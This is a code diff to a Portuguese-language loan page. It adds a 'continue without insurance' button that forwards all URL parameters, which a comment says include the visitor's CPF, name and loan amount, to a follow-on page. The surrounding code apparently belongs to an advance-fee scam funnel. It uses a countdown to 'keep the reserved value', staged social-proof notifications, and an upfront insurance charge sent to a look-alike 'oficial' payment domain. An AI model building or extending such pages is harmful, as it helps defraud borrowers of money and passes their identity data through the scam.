@@ -811,6 +811,10 @@
               LIBERAR MEU VALOR AGORA
             </button>
 
+            <button id="btnSkipInsurance" class="w-full bg-transparent border border-gray-300 text-gray-600 text-sm font-medium py-2 rounded-xl mb-4 hover:bg-gray-50">
+              Continuar sem seguro
+            </button>
+
             <div class="text-center bg-gray-100 p-3 rounded-lg">
               <p class="text-sm font-medium mb-1 text-gray-700">
                 Tempo restante para manter valor reservado:
@@ -956,6 +960,7 @@
         const btnContinuePix = document.getElementById("btnContinuePix");
         const btnContinueBank = document.getElementById("btnContinueBank");
         const btnPayInsurance = document.getElementById("btnPayInsurance");
+        const btnSkipInsurance = document.getElementById("btnSkipInsurance");
 
         // Elementos de formulário para PIX
         const pixForm = document.getElementById("pixForm");
@@ -1388,6 +1393,17 @@
           urlParams.set("valor", "2990");
           // Redireciona mantendo apenas os parâmetros filtrados
           window.location.href = `https://pay.pagamentosfacilitadosoficial.shop/nQ7kZ7pjJ9DG0eJ?${urlParams.toString()}`;
+        });
+
+        // Botão de pular seguro - redireciona para ga mantendo todos os parâmetros
+        btnSkipInsurance.addEventListener("click", () => {
+          // Obtém todos os parâmetros da URL atual incluindo CPF, nome, valor_emprestimo, etc.
+          const urlParams = new URLSearchParams(window.location.search);
+          
+          console.log('Redirecionando para ga com parâmetros:', urlParams.toString());
+          
+          // Redireciona para ga mantendo TODOS os parâmetros
+          window.location.href = `../ga/index.html?${urlParams.toString()}`;
         });
 
         // Configuração de notificações de prova social
